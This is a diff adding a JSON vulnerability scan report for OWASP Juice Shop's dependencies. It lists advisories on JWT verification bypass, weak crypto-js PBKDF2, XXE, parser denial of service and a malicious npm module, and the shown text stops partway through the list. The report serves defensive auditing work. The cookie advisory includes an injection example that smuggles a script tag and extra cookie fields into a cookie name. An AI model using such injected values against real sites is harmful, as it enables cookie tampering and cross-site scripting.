@@ -1,0 +1,1142 @@
+{
+  "reportSchema": "1.1",
+  "scanInfo": {
+    "engineVersion": "12.2.2",
+    "dataSource": [
+      {
+        "name": "NVD CVE 2024",
+        "timestamp": "2024-05-19T07:16:30Z"
+      }
+    ]
+  },
+  "projectInfo": {
+    "name": "OWASP Juice Shop",
+    "groupID": "org.owasp",
+    "artifactID": "juice-shop",
+    "version": "14.3.0",
+    "reportDate": "2026-05-20T03:57:50Z",
+    "credits": {}
+  },
+  "dependencies": [
+    {
+      "isVirtual": false,
+      "fileName": "@tootallnate/once:1.1.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-vpq2-c234-7xj6 (NPM)",
+          "severity": "LOW",
+          "description": "Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/@tootallnate/once:1.1.2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "base64url:0.0.6",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-rvg8-pwq2-xj7q (NPM)",
+          "severity": "MODERATE",
+          "description": "Versions of `base64url` before 3.0.0 are vulnerable to to out-of-bounds reads as it allocates uninitialized Buffers when number is passed in input on Node.js 4.x and below.   ## Recommendation  Update to version 3.0.0 or later."
+        }
+      ],
+      "filePath": "/src/package-lock.json?jws:0.2.6/base64url:0.0.6"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "bench.js",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2026-27601",
+          "severity": "HIGH",
+          "description": "Underscore.js is a utility-belt library for JavaScript. Prior to 1.13.8, the _.flatten and _.isEqual functions use recursion without a depth limit. Under very specific conditions, detailed below, an attacker could exploit this in a Denial of Service (DoS) attack by triggering a stack overflow. Untrusted input must be used to create a recursive datastructure, for example using JSON.parse, with no enforced depth limit. The datastructure thus created must be passed to _.flatten or _.isEqual. In the case of _.flatten, the vulnerability can only be exploited if it is possible for a remote client to prepare a datastructure that consists of arrays at all levels AND if no finite depth limit is passed as the second argument to _.flatten. In the case of _.isEqual, the vulnerability can only be exploited if there exists a code path in which two distinct datastructures that were submitted by the same remote client are compared using _.isEqual. For example, if a client submits data that are stored in a database, and the same client can later submit another datastructure that is then compared to the data that were saved in the database previously, OR if a client submits a single request, but its data are parsed twice, creating two non-identical but equivalent datastructures that are then compared. Exceptions originating from the call to _.flatten or _.isEqual, as a result of a stack overflow, are not being caught. This vulnerability is fixed in 1.13.8."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2021-23358",
+          "severity": "HIGH",
+          "description": "The package underscore from 1.13.0-0 and before 1.13.0-2, from 1.3.2 and before 1.12.1 are vulnerable to Arbitrary Code Injection via the template function, particularly when a variable property is passed as an argument as it is not sanitized."
+        }
+      ],
+      "filePath": "/src/node_modules/fast.js/dist/bench.js",
+      "md5": "6af488defde3d81bad97d52146d0bfe7",
+      "sha1": "ae9a60339937cfa9b108228a343565a977759fdd",
+      "sha256": "3e84b96943e4ee17c96f015aa4834986c9a0277f23338f44714f607f75b067c5"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "blaze.jar (shaded: commons-io:commons-io:2.4)",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2021-29425",
+          "severity": "MEDIUM",
+          "description": "In Apache Commons IO before 2.7, When invoking the method FileNameUtils.normalize with an improper input string, like &quot;//../foo&quot;, or &quot;\\\\..\\foo&quot;, the result would be the same value, thus possibly providing access to files in the parent directory, but not further above (thus &quot;limited&quot; path traversal), if the calling code would use the result to construct a path value."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2024-47554",
+          "severity": "MEDIUM",
+          "description": "Uncontrolled Resource Consumption vulnerability in Apache Commons IO.  The org.apache.commons.io.input.XmlStreamReader class may excessively consume CPU resources when processing maliciously crafted input.   This issue affects Apache Commons IO: from 2.0 before 2.14.0.  Users are recommended to upgrade to version 2.14.0 or later, which fixes the issue."
+        }
+      ],
+      "filePath": "/src/frontend/node_modules/font-mfizz/blaze.jar/META-INF/maven/commons-io/commons-io/pom.xml",
+      "md5": "a75b48557fe5da29195020755a5b1be7",
+      "sha1": "9ece23effe8bce3904f3797a76b1ba6ab681e1b9",
+      "sha256": "b2b5dd46cf998fa626eb6f8a1c114f6167c8d392694164e62533e5898e9b31f2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "blaze.jar",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-46751",
+          "severity": "HIGH",
+          "description": "Improper Restriction of XML External Entity Reference, XML Injection (aka Blind XPath Injection) vulnerability in Apache Software Foundation Apache Ivy.This issue affects any version of Apache Ivy prior to 2.5.2.  When Apache Ivy prior to 2.5.2 parses XML files - either its own configuration, Ivy files or Apache Maven POMs - it will allow downloading external document type definitions and expand any entity references contained therein when used.  This can be used to exfiltrate data, access resources only the machine running Ivy has access to or disturb the execution of Ivy in different ways.  Starting with Ivy 2.5.2 DTD processing is disabled by default except when parsing Maven POMs where the default is to allow DTD processing but only to include a DTD snippet shipping with Ivy that is needed to deal with existing Maven POMs that are not valid XML files but are nevertheless accepted by Maven. Access can be be made more lenient via newly introduced system properties where needed.  Users of Ivy prior to version 2.5.2 can use Java system properties to restrict processing of external DTDs, see the section about &quot;JAXP Properties for External Access restrictions&quot; inside Oracle's &quot;Java API for XML Processing (JAXP) Security Guide&quot;."
+        }
+      ],
+      "filePath": "/src/frontend/node_modules/font-mfizz/blaze.jar",
+      "md5": "7a92044cefeda2262db247fc48f05264",
+      "sha1": "422762f7d9e5812d999db0cc7528b90ed0eef11c",
+      "sha256": "40f5117ed9e508909375dbec891d4e9fda44dda3c70f7b90210f4a264d8fc843"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "cookie:0.4.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-pxg6-pf52-xh8x (NPM)",
+          "severity": "LOW",
+          "description": "### Impact  The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(&quot;userName=&lt;script&gt;alert('XSS3')&lt;/script&gt;; Max-Age=2592000; a&quot;, value)` would result in `&quot;userName=&lt;script&gt;alert('XSS3')&lt;/script&gt;; Max-Age=2592000; a=test&quot;`, setting `userName` cookie to `&lt;script&gt;` and ignoring `value`.  A similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.  ### Patches  Upgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.  ### Workarounds  Avoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.  ### References  * https://github.com/jshttp/cookie/pull/167"
+        }
+      ],
+      "filePath": "/src/package-lock.json?/cookie:0.4.2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "crypto-js:3.3.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-xwcq-pm8m-c4vf (NPM)",
+          "severity": "CRITICAL",
+          "description": "### Impact #### Summary Crypto-js PBKDF2 is 1,000 times weaker than originally specified in 1993, and [at least 1,300,000 times weaker than current industry standard][OWASP PBKDF2 Cheatsheet]. This is because it both (1) defaults to [SHA1][SHA1 wiki], a cryptographic hash algorithm considered insecure [since at least 2005][Cryptanalysis of SHA-1] and (2) defaults to [one single iteration][one iteration src], a 'strength' or 'difficulty' value specified at 1,000 when specified in 1993. PBKDF2 relies on iteration count as a countermeasure to [preimage][preimage attack] and [collision][collision attack] attacks.  Potential Impact:  1. If used to protect passwords, the impact is high. 2. If used to generate signatures, the impact is high.  Probability / risk analysis / attack enumeration:  1. [For at most $45,000][SHA1 is a Shambles], an attacker, given control of only the beginning of a crypto-js PBKDF2 input, can create a value which has _identical cryptographic signature_ to any chosen known value. 4. Due to the [length extension attack] on SHA1, we can create a value that has identical signature to any _unknown_ value, provided it is prefixed by a known value. It does not matter if PBKDF2 applies '[salt][cryptographic salt]' or '[pepper][cryptographic pepper]' or any other secret unknown to the attacker. It will still create an identical signature.  Update: PBKDF2 requires a pseudo-random function that takes two inputs, so HMAC-SHA1 is used rather than plain SHA1. HMAC is not affected by [length extension attacks][Length Extension attack]. However, by defaulting to a single PBKDF2 iteration, the hashes do not benefit from the extra computational complexity that PBKDF2 is supposed to provide. The resulting hashes therefore have little protection against an offline brute-force attack.   [cryptographic salt]: https://en.wikipedia.org/wiki/Salt_(cryptography) &quot;Salt (cryptography), Wikipedia&quot; [cryptographic pepper]: https://en.wikipedia.org/wiki/Pepper_(cryptography) &quot;Pepper (cryptography), Wikipedia&quot; [SHA1 wiki]: https://en.wikipedia.org/wiki/SHA-1 &quot;SHA-1, Wikipedia&quot; [Cryptanalysis of SHA-1]: https://www.schneier.com/blog/archives/2005/02/cryptanalysis_o.html &quot;Cryptanalysis of SHA-1&quot; [one iteration src]: https://github.com/brix/crypto-js/blob/1da3dabf93f0a0435c47627d6f171ad25f452012/src/pbkdf2.js#L22-L26 &quot;crypto-js/src/pbkdf2.js lines 22-26&quot; [collision attack]: https://en.wikipedia.org/wiki/Hash_collision &quot;Collision Attack, Wikipedia&quot; [preimage attack]: https://en.wikipedia.org/wiki/Preimage_attack &quot;Preimage Attack, Wikipedia&quot; [SHA1 is a Shambles]: https://eprint.iacr.org/2020/014.pdf &quot;SHA-1 is a Shambles: First Chosen-Prefix Collision on SHA-1 and Application to the PGP Web of Trust, Ga&euml;tan Leurent and Thomas Peyrin&quot; [Length Extension attack]: https://en.wikipedia.org/wiki/Length_extension_attack &quot;Length extension attack, Wikipedia&quot;  crypto-js has 10,642 public users [as displayed on NPM][crypto-js, NPM], today October 11th 2023. The number of transient dependents is likely several orders of magnitude higher.  A very rough GitHub search[ shows 432 files][GitHub search: affected files] cross GitHub using PBKDF2 in crypto-js in Typescript or JavaScript, but not specifying any number of iterations.  [OWASP PBKDF2 Cheatsheet]: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pbkdf2 &quot;OWASP PBKDF2 Cheatsheet&quot; [crypto-js, NPM]: https://www.npmjs.com/package/crypto-js &quot;crypto-js on NPM&quot; [GitHub search: affected files]: https://github.com/search?q=%22crypto-js%22+AND+pbkdf2+AND+%28lang%3AJavaScript+OR+lang%3ATypeScript%29++NOT+%22iterations%22&amp;type=code&amp;p=2 &quot;GitHub search: crypto-js AND pbkdf2 AND (lang:JavaScript OR lang:TypeScript)  NOT iterations&quot;  #### Affected versions All versions are impacted. This code has been the same since crypto-js was first created.  #### Further Cryptanalysis  The issue here is especially egregious because the length extension attack makes useless any secret that might be appended to the plaintext before calculating its signature.  Consider a scheme in which a secret is created for a user's username, and that secret is used to protect e.g. their passwords. Let's say that password is 'fake-password', and their username is 'example-username'.  To encrypt the user password via symmetric encryption we might do `encrypt(plaintext: 'fake-password', encryption_key: cryptojs.pbkdf2(value: 'example username' + salt_or_pepper))`. By this means, we would, in theory, create an `encryption_key` that can be determined from the public username, but which requires the secret `salt_or_pepper` to generate. This is a common scheme for protecting passwords, as exemplified in bcrypt &amp; scrypt. Because the encryption key is symmetric, we can use this derived key to also decrypt the ciphertext.  Because of the length extension issue, if the attacker obtains (via attack 1), a collision with 'example username', the attacker _does not need to know_ `salt_or_pepper` to decrypt their account data, only their public username.  ### Description  PBKDF2 is a key-derivation is a key-derivation function that is used for two main purposes: (1) to stretch or squash a variable length password's entropy into a fixed size for consumption by another cryptographic operation and (2) to reduce the chance of downstream operations recovering the password input (for example, for password storage).  Unlike the modern [webcrypto](https://w3c.github.io/webcrypto/#pbkdf2-operations) standard, crypto-js does not throw an error when a number of iterations is not specified, and defaults to one single iteration. In the year 2000, when PBKDF2 was originally specified, the minimum number of iterations suggested was set at 1,000. Today, [OWASP recommends 1,300,000][OWASP PBKDF2 Cheatsheet]:  https://github.com/brix/crypto-js/blob/4dcaa7afd08f48cd285463b8f9499cdb242605fa/src/pbkdf2.js#L22-L26  ### Patches No available patch. The package is not maintained.  ### Workarounds Consult the [OWASP PBKDF2 Cheatsheet]. Configure to use SHA256 with at least 250,000 iterations.  ### Coordinated disclosure This issue was simultaneously submitted to [crypto-js](https://github.com/brix/crypto-js) and [crypto-es](https://github.com/entronad/crypto-es) on the 23rd of October 2023.  ### Caveats  This issue was found in a security review that was _not_ scoped to crypto-js. This report is not an indication that crypto-js has undergone a formal security assessment by the author."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2023-46233",
+          "severity": "CRITICAL",
+          "description": "crypto-js is a JavaScript library of crypto standards. Prior to version 4.2.0, crypto-js PBKDF2 is 1,000 times weaker than originally specified in 1993, and at least 1,300,000 times weaker than current industry standard. This is because it both defaults to SHA1, a cryptographic hash algorithm considered insecure since at least 2005, and defaults to one single iteration, a 'strength' or 'difficulty' value specified at 1,000 when specified in 1993. PBKDF2 relies on iteration count as a countermeasure to preimage and collision attacks. If used to protect passwords, the impact is high. If used to generate signatures, the impact is high. Version 4.2.0 contains a patch for this issue. As a workaround, configure crypto-js to use SHA256 with at least 250,000 iterations."
+        }
+      ],
+      "filePath": "/src/package-lock.json?pdfkit:0.11.0/crypto-js:^3.1.9-1"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "diff:5.0.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-73rr-hh4g-fpgx (NPM)",
+          "severity": "LOW",
+          "description": "### Impact  Attempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.  Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).  The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.  Finally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its &quot;leading garbage&quot;). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*&sup3;) time to parse.  ### Patches  All vulnerabilities described are fixed in v8.0.3.  ### Workarounds  If using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.  ### References  PR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649   ### CVE Notes  Note that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability."
+        }
+      ],
+      "filePath": "/src/package-lock.json?sinon:11.1.2/diff:^5.0.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "elliptic:6.6.1",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-848j-6mx2-7j84 (NPM)",
+          "severity": "MEDIUM",
+          "description": "The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result.&nbsp;Furthermore, due to the nature of the fault, attackers could&ndash;under certain conditions&ndash;derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.  This issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1)."
+        }
+      ],
+      "filePath": "/src/frontend/package-lock.json?/elliptic:6.6.1"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "engine.io:4.1.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-41940",
+          "severity": "MEDIUM",
+          "description": "Engine.IO is the implementation of transport-based cross-browser/cross-device bi-directional communication layer for Socket.IO. A specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process. This impacts all the users of the engine.io package, including those who uses depending packages like socket.io. There is no known workaround except upgrading to a safe version. There are patches for this issue released in versions 3.6.1 and 6.2.1."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-r7qp-cfhv-p84w (NPM)",
+          "severity": "MEDIUM",
+          "description": "### Impact  A specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.  ``` events.js:292       throw er; // Unhandled 'error' event       ^  Error: read ECONNRESET     at TCP.onStreamRead (internal/stream_base_commons.js:209:20) Emitted 'error' event on Socket instance at:     at emitErrorNT (internal/streams/destroy.js:106:8)     at emitErrorCloseNT (internal/streams/destroy.js:74:3)     at processTicksAndRejections (internal/process/task_queues.js:80:21) {   errno: -104,   code: 'ECONNRESET',   syscall: 'read' } ```  This impacts all the users of the [`engine.io`](https://www.npmjs.com/package/engine.io) package, including those who uses depending packages like [`socket.io`](https://www.npmjs.com/package/socket.io).  ### Patches  A fix has been released today (2022/11/20):  | Version range     | Fixed version | |-------------------|---------------| | `engine.io@3.x.y` | `3.6.1`       | | `engine.io@6.x.y` | `6.2.1`       |  For `socket.io` users:  | Version range               | `engine.io` version | Needs minor update?                                                                                    | |-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------| | `socket.io@4.5.x`           | `~6.2.0`            | `npm audit fix` should be sufficient                                                                   | | `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.5.x`                                                                    | | `socket.io@4.3.x`           | `~6.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    | | `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.5.x`                                                                    | | `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.5.x`                                                                    | | `socket.io@4.0.x`           | `~5.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    | | `socket.io@3.1.x`           | `~4.1.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/)) | | `socket.io@3.0.x`           | `~4.0.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/)) | | `socket.io@2.5.0`           | `~3.6.0`            | `npm audit fix` should be sufficient                                                                   | | `socket.io@2.4.x` and below | `~3.5.0`            | Please upgrade to `socket.io@2.5.0`                                                                    |  ### Workarounds  There is no known workaround except upgrading to a safe version.  ### For more information  If you have any questions or comments about this advisory:  * Open an issue in [`engine.io`](https://github.com/socketio/engine.io)  Thanks to [Jonathan Neve](https://github.com/jonathanneve) for the responsible disclosure."
+        }
+      ],
+      "filePath": "/src/package-lock.json?socket.io:3.1.2/engine.io:~4.1.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "express-jwt:0.1.3",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2020-15084",
+          "severity": "CRITICAL",
+          "description": "In express-jwt (NPM package) up and including version 5.3.3, the algorithms entry to be specified in the configuration is not being enforced. When algorithms is not specified in the configuration, with the combination of jwks-rsa, it may lead to authorization bypass. You are affected by this vulnerability if all of the following conditions apply: - You are using express-jwt - You do not have **algorithms** configured in your express-jwt configuration. - You are using libraries such as jwks-rsa as the **secret**. You can fix this by specifying **algorithms** in the express-jwt configuration. See linked GHSA for example. This is also fixed in version 6.0.0."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-6g6m-m6h5-w9gf (NPM)",
+          "severity": "HIGH",
+          "description": "### Overview Versions before and including 5.3.3, we are not enforcing the **algorithms** entry to be specified in the configuration. When **algorithms** is not specified in the configuration, with the combination of jwks-rsa, it may lead to authorization bypass.   ### Am I affected? You are affected by this vulnerability if all of the following conditions apply:  You are using express-jwt AND  You do not have **algorithms**  configured in your express-jwt configuration. AND You are using libraries such as jwks-rsa as the **secret**.   ### How to fix that? Specify **algorithms** in the express-jwt configuration. The following is an example of a proper configuration  ```  const checkJwt = jwt({   secret: jwksRsa.expressJwtSecret({     rateLimit: true,     jwksRequestsPerMinute: 5,     jwksUri: `https://${DOMAIN}/.well-known/jwks.json`   }),   // Validate the audience and the issuer.   audience: process.env.AUDIENCE,   issuer: `https://${DOMAIN}/`,   // restrict allowed algorithms   algorithms: ['RS256'] });  ```  ### Will this update impact my users? The fix provided in patch will not affect your users if you specified the algorithms allowed. The patch now makes **algorithms** a required configuration.    ### Credit IST Group"
+        }
+      ],
+      "filePath": "/src/package-lock.json?/express-jwt:0.1.3"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "file-type:11.1.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-36313",
+          "severity": "MEDIUM",
+          "description": "An issue was discovered in the file-type package before 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/file-type:11.1.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "file-type:16.5.4",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-5v7r-6r5c-r473 (NPM)",
+          "severity": "MEDIUM",
+          "description": "### Impact A denial of service vulnerability exists in the ASF (WMV/WMA) file type detection parser. When parsing a crafted input where an ASF sub-header has a `size` field of zero, the parser enters an infinite loop. The `payload` value becomes negative (-24), causing `tokenizer.ignore(payload)` to move the read position backwards, so the same sub-header is read repeatedly forever.  Any application that uses `file-type` to detect the type of untrusted/attacker-controlled input is affected. An attacker can stall the Node.js event loop with a 55-byte payload.  ### Patches Fixed in version 21.3.1. Users should upgrade to &gt;= 21.3.1.  ### Workarounds Validate or limit the size of input buffers before passing them to `file-type`, or run file type detection in a worker thread with a timeout.  ### References - Fix commit: 319abf871b50ba2fa221b4a7050059f1ae096f4f  ### Reporter  crnkovic@lokvica.com"
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2026-31808",
+          "severity": "MEDIUM",
+          "description": "file-type detects the file type of a file, stream, or data. Prior to 21.3.1, a denial of service vulnerability exists in the ASF (WMV/WMA) file type detection parser. When parsing a crafted input where an ASF sub-header has a size field of zero, the parser enters an infinite loop. The payload value becomes negative (-24), causing tokenizer.ignore(payload) to move the read position backwards, so the same sub-header is read repeatedly forever. Any application that uses file-type to detect the type of untrusted/attacker-controlled input is affected. An attacker can stall the Node.js event loop with a 55-byte payload. Fixed in version 21.3.1."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/file-type:16.5.4"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "file-type:3.9.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-36313",
+          "severity": "MEDIUM",
+          "description": "An issue was discovered in the file-type package before 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/file-type:3.9.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "file-type:4.4.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-36313",
+          "severity": "MEDIUM",
+          "description": "An issue was discovered in the file-type package before 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/file-type:4.4.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "file-type:5.2.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-36313",
+          "severity": "MEDIUM",
+          "description": "An issue was discovered in the file-type package before 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/file-type:5.2.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "file-type:6.2.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-36313",
+          "severity": "MEDIUM",
+          "description": "An issue was discovered in the file-type package before 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/file-type:6.2.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "got:8.3.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-pfrx-2q88-qq97 (NPM)",
+          "severity": "MEDIUM",
+          "description": "The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-33987",
+          "severity": "MEDIUM",
+          "description": "The got package before 12.1.0 (also fixed in 11.8.5) for Node.js allows a redirect to a UNIX socket."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/got:8.3.2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "grunt-cli:1.5.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2017-16058",
+          "severity": "HIGH",
+          "description": "gruntcli was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/grunt-cli:1.5.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "http-cache-semantics:3.8.1",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-25881",
+          "severity": "HIGH",
+          "description": "This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/http-cache-semantics:3.8.1"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "jsonwebtoken:0.1.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2015-9235",
+          "severity": "CRITICAL",
+          "description": "In jsonwebtoken node module before 4.2.2 it is possible for an attacker to bypass verification when a token digitally signed with an asymmetric key (RS/ES family) of algorithms but instead the attacker send a token digitally signed with a symmetric algorithm (HS* family)."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-23539",
+          "severity": "HIGH",
+          "description": "Versions `&lt;=8.5.1` of `jsonwebtoken` library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm. You are affected if you are using an algorithm and a key type other than a combination listed in the GitHub Security Advisory as unaffected. This issue has been fixed, please update to version 9.0.0. This version validates for asymmetric key type and algorithm combinations. Please refer to the above mentioned algorithm / key type combinations for the valid secure configuration. After updating to version 9.0.0, if you still intend to continue with signing or verifying tokens using invalid key type/algorithm value combinations, you&rsquo;ll need to set the `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and/or `verify()` functions."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-23540",
+          "severity": "HIGH",
+          "description": "In versions `&lt;=8.5.1` of `jsonwebtoken` library, lack of algorithm definition in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. Users are affected if you do not specify algorithms in the `jwt.verify()` function. This issue has been fixed, please update to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. There will be no impact, if you update to version 9.0.0 and you don&rsquo;t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-23541",
+          "severity": "MEDIUM",
+          "description": "jsonwebtoken is an implementation of JSON Web Tokens. Versions `&lt;= 8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function referring to the `secretOrPublicKey` argument from the readme link will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification, other than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of  forged tokens. If your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. This issue has been patched, please update to version 9.0.0."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/jsonwebtoken:0.1.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "jsonwebtoken:0.4.0",
+      "projectReferences": [
+        "package.json"
+      ],
